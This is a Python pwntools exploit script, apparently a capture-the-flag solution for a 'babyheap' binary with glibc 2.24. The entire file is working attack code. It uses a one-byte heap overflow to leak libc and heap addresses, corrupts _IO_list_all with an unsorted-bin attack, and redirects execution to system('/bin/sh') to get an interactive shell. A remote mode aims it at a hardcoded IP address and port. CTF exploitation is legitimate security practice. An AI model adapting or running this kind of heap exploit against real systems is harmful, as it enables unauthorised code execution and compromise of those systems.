from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./babyheap"
LIBC = "./libc-2.24.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("Command: ")

def allocate(conn, sz):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil("Size: ")
    conn.sendline(str(sz))

def update(conn, idx, sz, s):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("Index: ")
    conn.sendline(str(idx))
    conn.recvuntil("Size: ")
    conn.sendline(str(sz))
    conn.recvuntil("Content: ")
    conn.send(s)

def mdelete(conn, idx):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil("Index: ")
    conn.sendline(str(idx))

def view(conn, idx):
    recvmenu(conn)
    conn.sendline("4")
    conn.recvuntil("Index: ")
    conn.sendline(str(idx))

def exploit(conn, elf, libc, local):
    allocate(conn, 0x58) # 0
    allocate(conn, 0x58) # 1
    allocate(conn, 0x58) # 2
    allocate(conn, 0x48) # 3
    allocate(conn, 0x58) # 4
    allocate(conn, 0x58) # 5
    allocate(conn, 0x58) # 6
    allocate(conn, 0x58) # 7
    allocate(conn, 0x28) # 8
    allocate(conn, 0x48) # 9
    allocate(conn, 0x28) # 10

    payload = ""
    payload += "A"*0x58
    payload += "\xc1"
    update(conn, 0, 0x59, payload)
    #update(conn, 2, 0x58, p64(0x21) * (0x58/8))

    mdelete(conn, 1)
    allocate(conn, 0x58)
    view(conn, 2)
    conn.recvuntil("Chunk[2]: ")
    leak = u64(conn.recv(8))
    libc.address = leak - 0x399B00 - 88 # 0x39e9a8 - 88 - 0x158# 0x3c1b58# 0x39E9A8 # 0x3c4b78
    log.info("%#x", leak)
    log.info("%#x", libc.address)

    payload = ""
    payload += "A"*0x28
    payload += "\x61"
    update(conn, 8, 0x29, payload)
    update(conn, 10, 0x10, "A"*8 + p64(0x21))
    mdelete(conn, 9)
    allocate(conn, 0x58)
    update(conn, 9, 0x50, "A"*0x48 + p64(0x31))
    mdelete(conn, 8)
    mdelete(conn, 10)
    view(conn, 9)
    conn.recvuntil("Chunk[9]: ")
    conn.recv(0x50)
    heapleak = u64(conn.recv(8))
    heapaddr = heapleak & ~0xfff
    log.info("%#x", heapaddr)

    update(conn, 1, 0x58, "A"*0x50 + "/bin/sh\x00")
    update(conn, 2, 0x20, p64(leak) + p64(libc.symbols["_IO_list_all"] - 0x10) + p64(2) + p64(3))

    payload = ""
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(heapaddr + 0x10)
    update(conn, 4, 0x20, payload)

    update(conn, 0, 0x20, p64(libc.symbols['system']) * 4)

    allocate(conn, 10)

    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("202.120.7.204", 127)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
